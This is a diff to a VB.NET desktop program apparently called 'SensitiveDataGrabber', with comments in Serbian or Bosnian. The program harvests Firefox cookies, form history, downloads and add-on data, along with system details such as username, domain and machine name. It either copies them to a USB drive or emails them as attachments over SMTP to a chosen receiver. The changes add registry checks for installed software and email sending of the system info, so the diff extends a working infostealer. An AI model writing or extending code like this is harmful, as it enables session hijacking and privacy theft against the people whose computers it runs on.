@@ -34,34 +34,38 @@ Public Class MainForm
     Dim steamDirectory As String = "C:\Program Files (x86)\Steam\config\"
     Dim WoTDirectory As String = "C:\Users\" & username & "\AppData\Roaming\Wargaming.net\WorldofTanks"
 
-    Private Function checkIfInstalled(ByVal software As String) As String
-        Dim path As String = Nothing
+    ' temporary file for basic info
+    Dim temporary As String = System.IO.Path.GetTempFileName()
 
+    Private Function checkIfInstalled(ByVal software As String) As String
+        Dim regPath As String = ""
+        Dim regkey As RegistryKey
         Select Case software
             Case "Chrome"
-                path = "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
+                regPath = ("Software\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome")
             Case "Evernote"
-                path = "C:\Program Files (x86)\Evernote\Evernote\Evernote.exe"
+                regPath = ("Software\Evernote")
             Case "Firefox"
-                path = "C:\Program Files (x86)\Mozilla Firefox\firefox.exe"
+                regPath = ("Software\Mozilla\Firefox")
             Case "OneNote"
-
+                regPath = ("Software\Microsoft\Office\15.0\OneNote")
             Case "Pidgin"
-                path = "C:\Program Files (x86)\Pidgin\pidgin.exe"
+                regPath = ("Software\pidgin")
             Case "Steam"
-                path = "C:\Program Files (x86)\Steam\Steam.exe"
+                regPath = ("Software\Valve\Steam")
             Case "Thunderbird"
-                path = "C:\Program Files (x86)\Mozilla Thunderbird\thunderbird.exe"
+                regPath = ("Software\Mozilla\Thunderbird")
             Case "World of Tanks"
-                path = "C:\Games\World_of_Tanks\WorldOfTanks.exe"
         End Select
 
-        If File.Exists(path) Then
-            Return "Yes"
-        Else
+        regkey = My.Computer.Registry.LocalMachine.OpenSubKey(regPath)
+
+        If regkey Is Nothing Then
             Return "No"
+        Else
+            Return "Yes"
         End If
-        Return Nothing
+
     End Function
     Private Function getUSBLetter()
         For Each d As System.IO.DriveInfo In My.Computer.FileSystem.Drives
@@ -103,19 +107,42 @@ Public Class MainForm
         Dim getTotalVirtualMemory As String = System.Math.Round(My.Computer.Info.TotalVirtualMemory / (1024 * 1024), 2).ToString
         Dim getAvailableVirtualMemory As String = System.Math.Round(My.Computer.Info.AvailableVirtualMemory / (1024 * 1024), 2).ToString
 
-        Using sw As StreamWriter = New StreamWriter(driveLetter & "SensitiveDataGrabber\basicinfo.txt")
-            sw.Write("OS: " & getOSVersion & vbCrLf)
-            sw.Write("Username: " & getUserName & vbCrLf)
-            sw.Write("Number of processors: " & getNoOfProcessors & vbCrLf)
-            sw.Write("Is system 64bit? " & getBits & vbCrLf)
-            sw.Write("Domain name: " & getDomainName & vbCrLf)
-            sw.Write("Machine name: " & getMachineName & vbCrLf)
-            sw.Write(vbCrLf)
-            sw.Write("Total physical memory: " & getTotalPhysicalMemory & vbCrLf)
-            sw.Write("Available physical memory: " & getAvailablePhysicalMemory & vbCrLf)
-            sw.Write("Total virtual memory: " & getTotalVirtualMemory & vbCrLf)
-            sw.Write("Available virtual memory: " & getAvailableVirtualMemory & vbCrLf)
-        End Using
+        If method = "1" Then
+            Using sw As StreamWriter = New StreamWriter(driveLetter & "SensitiveDataGrabber\basicinfo.txt")
+                sw.Write("OS: " & getOSVersion & vbCrLf)
+                sw.Write("Username: " & getUserName & vbCrLf)
+                sw.Write("Number of processors: " & getNoOfProcessors & vbCrLf)
+                sw.Write("Is system 64bit? " & getBits & vbCrLf)
+                sw.Write("Domain name: " & getDomainName & vbCrLf)
+                sw.Write("Machine name: " & getMachineName & vbCrLf)
+                sw.Write(vbCrLf)
+                sw.Write("Total physical memory: " & getTotalPhysicalMemory & vbCrLf)
+                sw.Write("Available physical memory: " & getAvailablePhysicalMemory & vbCrLf)
+                sw.Write("Total virtual memory: " & getTotalVirtualMemory & vbCrLf)
+                sw.Write("Available virtual memory: " & getAvailableVirtualMemory & vbCrLf)
+            End Using
+
+        ElseIf method = "2" Then
+            MessageBox.Show(temporary)
+            Using sw As StreamWriter = New StreamWriter(temporary)
+                sw.WriteLine("OS: " & getOSVersion)
+                sw.WriteLine("Username: " & getUserName)
+                sw.WriteLine("Number of processors: " & getNoOfProcessors)
+                sw.WriteLine("Is system 64bit? " & getBits)
+                sw.WriteLine("Domain name: " & getDomainName)
+                sw.WriteLine("Machine name: " & getMachineName)
+                sw.WriteLine()
+                sw.WriteLine("Total physical memory: " & getTotalPhysicalMemory)
+                sw.WriteLine("Available physical memory: " & getAvailablePhysicalMemory)
+                sw.WriteLine("Total virtual memory: " & getTotalVirtualMemory)
+                sw.WriteLine("Available virtual memory: " & getAvailableVirtualMemory)
+            End Using
+            Dim basicInfo As Attachment
+            basicInfo = New Attachment(temporary, "text/plain")
+            mail.Attachments.Add(basicInfo)
+        Else
+
+        End If
 
         Return Nothing
     End Function
@@ -174,25 +201,41 @@ Public Class MainForm
 
         If method = "1" Then
             If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Firefox") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Firefox")
-            File.Copy(firefoxDirectory & "cookies.sqlite", driveLetter & "SensitiveDataGrabber\Firefox\cookies.sqlite", True)
-            File.Copy(firefoxDirectory & "addons.json", driveLetter & "SensitiveDataGrabber\Firefox\addons.txt", True)
-            'File.Copy(firefoxDirectory & "downloads.json", driveLetter & "SensitiveDataGrabber\Firefox\downloads.txt", True)
-            File.Copy(firefoxDirectory & "formhistory.sqlite", driveLetter & "SensitiveDataGrabber\Firefox\formhistory.sqlite", True)
+            If File.Exists(firefoxDirectory & "cookies.sqlite") Then File.Copy(firefoxDirectory & "cookies.sqlite", driveLetter & "SensitiveDataGrabber\Firefox\cookies.sqlite", True)
+            If File.Exists(firefoxDirectory & "addons.json") Then File.Copy(firefoxDirectory & "addons.json", driveLetter & "SensitiveDataGrabber\Firefox\addons.txt", True)
+            If File.Exists(firefoxDirectory & "downloads.json") Then File.Copy(firefoxDirectory & "downloads.json", driveLetter & "SensitiveDataGrabber\Firefox\downloads.txt", True)
+            If File.Exists(firefoxDirectory & "formhistory.sqlite") Then File.Copy(firefoxDirectory & "formhistory.sqlite", driveLetter & "SensitiveDataGrabber\Firefox\formhistory.sqlite", True)
         ElseIf method = "2" Then
-            Dim firefoxCookies As Attachment = New Attachment(firefoxDirectory & "cookies.sqlite")
-            Dim firefoxAddons As Attachment = New Attachment(firefoxDirectory & "addons.json")
-            'Dim firefoxDownloads As Attachment = New Attachment(firefoxDirectory & "downloads.json")
-            Dim firefoxFormHistory As Attachment = New Attachment(firefoxDirectory & "formhistory.sqlite")
+            Dim firefoxCookies As Attachment
+            Dim firefoxAddons As Attachment
+            Dim firefoxDownloads As Attachment
+            Dim firefoxFormHistory As Attachment
 
-            mail.Attachments.Add(firefoxCookies)
-            mail.Attachments.Add(firefoxAddons)
-            'mail.Attachments.Add(firefoxDownloads)
-            mail.Attachments.Add(firefoxFormHistory)
+            If File.Exists(firefoxDirectory & "cookies.sqlite") Then
+                firefoxCookies = New Attachment(firefoxDirectory & "cookies.sqlite")
+                mail.Attachments.Add(firefoxCookies)
+            End If
+
+            If File.Exists(firefoxDirectory & "addons.json") Then
+                firefoxAddons = New Attachment(firefoxDirectory & "addons.json")
+                mail.Attachments.Add(firefoxAddons)
+            End If
+
+            If File.Exists(firefoxDirectory & "downloads.json") Then
+                firefoxDownloads = New Attachment(firefoxDirectory & "downloads.json")
+                mail.Attachments.Add(firefoxDownloads)
+            End If
+
+            If File.Exists(firefoxDirectory & "formhistory.sqlite") Then
+                firefoxFormHistory = New Attachment(firefoxDirectory & "formhistory.sqlite")
+                mail.Attachments.Add(firefoxFormHistory)
+            End If
+
         Else
 
         End If
 
-        ' Trebaće implementovati if exists za datoteke jer ne postoje ukoliko nema podataka u njima.
+
         Return Nothing
 
     End Function
@@ -272,19 +315,6 @@ Public Class MainForm
         Return Nothing
     End Function
 
-
-    Private Function getDefaultBrowser() As String
-        Dim retVal As String = String.Empty
-        Using baseKey As Microsoft.Win32.RegistryKey = My.Computer.Registry.CurrentUser.OpenSubKey("Software\Clients\StartmenuInternet")
-            Dim baseName As String = baseKey.GetValue("").ToString
-            Dim subKey As String = "SOFTWARE\" & IIf(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE") = "AMD64", "Wow6432Node\", "") & "Clients\StartMenuInternet\" & baseName
-            Using browserKey As Microsoft.Win32.RegistryKey = My.Computer.Registry.LocalMachine.OpenSubKey(subKey)
-                retVal = browserKey.GetValue("").ToString
-            End Using
-        End Using
-        Return retVal
-    End Function
-
     Private Function getFirefoxDirectory() As String
         Dim result As String = String.Empty
         Dim folder() As String = Directory.GetDirectories(firefoxDirectory)
@@ -318,6 +348,7 @@ Public Class MainForm
             Smtp_Server.Send(mail)
 
             MessageBox.Show("Email sent!")
+            System.IO.File.Delete(temporary)
 
         Catch error_t As Exception
             MsgBox(error_t.ToString)
@@ -328,6 +359,15 @@ Public Class MainForm
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
 
+        If checkIfInstalled("Chrome") <> "Yes" Then chkChrome.Enabled = False
+        If checkIfInstalled("Firefox") <> "Yes" Then chkFirefox.Enabled = False
+        If checkIfInstalled("Thunderbird") <> "Yes" Then chkThunderbird.Enabled = False
+        If checkIfInstalled("Steam") <> "Yes" Then chkSteam.Enabled = False
+        If checkIfInstalled("Pidgin") <> "Yes" Then chkPidgin.Enabled = False
+        If checkIfInstalled("OneNote") <> "Yes" Then chkOneNote.Enabled = False
+        If checkIfInstalled("World of Tanks") <> "Yes" Then chkWoT.Enabled = False
+        If checkIfInstalled("Evernote") <> "Yes" Then chkEvernote.Enabled = False
+
         RadioButton1.Enabled = True
         RadioButton1.Checked = True
         RadioButton2.Enabled = False
@@ -335,7 +375,7 @@ Public Class MainForm
         GroupBox2.Enabled = False
 
         getUSBLetter()
-        defaultBrowser = getDefaultBrowser()
+
     End Sub
 
 
@@ -396,6 +436,8 @@ Public Class MainForm
             method = "2"
             MessageBox.Show(emailSMTPServer & vbCrLf & emailSMTPPort & vbCrLf & emailSenderEmail & vbCrLf &
                          emailSenderPassword & vbCrLf & emailReciever & vbCrLf & emailDefaultSubject)
+            getBasicInfo()
+
             getChrome()
 
             sendMail()
@@ -438,6 +480,7 @@ Public Class MainForm
                 ElseIf emailCredentials.ComboBox1.SelectedItem.ToString = "Other" Then
                     emailSMTPServer = emailCredentials.TextBox1.Text
                     emailSMTPServer = emailCredentials.TextBox2.Text
+                    emailSenderEmail = emailCredentials.TextBox3.Text
                 End If
             End If
 
@@ -457,7 +500,6 @@ Public Class MainForm
     ' ============================================================================================
     ' ================ URADITI ================ URADITI =============== URADITI ==================
     ' ============================================================================================
-    ' ======= emailCredentials pod other će morati da ide nova forma.                      =======
     ' ======= Provjeravaj da li je program instaliran iz registra, ne iz explorera.        =======
     ' ======= Testirati program u virtuelnoj mašini.                                       =======
     ' ======= Trebace smisliti rjesenje za slanje foldera kao attachment.                  =======
